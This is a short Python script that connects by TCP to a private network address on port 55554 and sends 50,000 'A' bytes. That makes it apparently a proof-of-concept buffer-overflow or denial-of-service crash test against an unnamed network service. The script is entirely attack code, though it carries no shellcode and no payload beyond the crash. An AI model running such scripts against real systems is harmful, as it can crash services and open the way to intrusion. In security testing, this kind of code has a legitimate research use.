#!/usr/bin/python
import socket
 
TCP_IP = '192.168.1.100'
TCP_PORT = 55554
BUFFER_SIZE = 1024
MESSAGE = "\x41" * 50000
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(MESSAGE)
s.close()
